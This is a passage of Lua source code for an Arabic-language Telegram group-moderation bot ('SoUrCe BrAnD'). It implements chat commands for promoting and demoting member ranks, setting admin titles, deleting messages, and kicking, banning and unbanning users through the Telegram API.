else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المنشئين")  
end 
end
--     SoUrCe BrAnD     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المدراء")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع مدير (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المدراء")  
end
--     SoUrCe BrAnD     --
--       Rem Manager      --
if text ==('تنزيل مدير') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المدراء")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المدراء")  
end 
--     SoUrCe BrAnD     --
--       Set Cleaner      --
if text ==('رفع منظف') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المنظفين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع منظف (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المنظفين")  
end
--     SoUrCe BrAnD     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المنظفين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المنظفين")  
end end
--     SoUrCe BrAnD     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة الادمنيه")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not BasicConstructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة الادمنيه")  
end
--     SoUrCe BrAnD     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة الادمنيه")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة الادمنيه")  
end end
--     SoUrCe BrAnD     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevBrAnD:sadd(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المميزين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not BasicConstructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevBrAnD:sadd(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المميزين")  
end
--     SoUrCe BrAnD     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المميزين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المميزين")  
end end 
--     SoUrCe BrAnD     --
if BasicConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BrAnD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه مشرف في المجموعه")  
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BrAnD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من مشرفين المجموعه")  
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BrAnD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and SoUrCeCh(msg) then
local BrAnD = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BrAnD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم اضافة ↫ "..BrAnD.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..BrAnD)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف الرساله مع رسالة الامر', 1, 'md')
end end end
--     SoUrCe BrAnD     --
if Constructor(msg) then
if text:match("^تفعيل الحظر$") and ChCheck(msg) or text:match("^تفعيل الطرد$") and ChCheck(msg) then
DevBrAnD:del(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الطرد والحظر'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الحظر$") and ChCheck(msg) or text:match("^تعطيل الطرد$") and ChCheck(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_,"true")
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الطرد والحظر'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
if text:match("^تفعيل الكتم$") and ChCheck(msg) or text:match("^تفعيل التقييد$") and ChCheck(msg) then
DevBrAnD:del(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الكتم والتقيد'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الكتم$") and ChCheck(msg) or text:match("^تعطيل التقييد$") and ChCheck(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_,"true")
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الكتم والتقيد'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
end
if BasicConstructor(msg) then
if text:match("^تفعيل الرفع$") and ChCheck(msg) or text:match("^تفعيل الترقيه$") and ChCheck(msg) then
DevBrAnD:del(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
end
if text:match("^تعطيل الرفع$") and ChCheck(msg) or text:match("^تعطيل الترقيه$") and ChCheck(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Lock:ProSet"..msg.chat_id_,"true")
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
end
end
--     SoUrCe BrAnD     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"♰ ⌯ لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"♰ ⌯ لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم طرده من المجموعه")  
end,nil)
end
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) then
local user = text:match('طرد (%d+)')
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"♰ ⌯ لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم طرده من المجموعه")  
end,nil)
end
end
end 
--     SoUrCe BrAnD     --
--          Ban           --
if Admin(msg) then
local text = msg.content_.text_:gsub('حضر','حظر')
if text ==('حظر') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"♰ ⌯ لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevBrAnD:sadd(BrAnD..'BrAnD:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and text:match('^حظر @(.*)') and ChCheck(msg) then
local username = text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"♰ ⌯ لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevBrAnD:sadd(BrAnD..'BrAnD:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and text:match('^حظر (%d+)') and ChCheck(msg) then
local user = text:match('حظر (%d+)')
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"♰ ⌯ لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevBrAnD:sadd(BrAnD..'BrAnD:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم حظره من المجموعه")  
end,nil) 
end
end
--     SoUrCe BrAnD     --
--         UnBan          --
local text = msg.content_.text_:gsub('الغاء الحظر','الغاء حظر')
if text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and text:match('^الغاء حظر @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء حظر @(.*)')
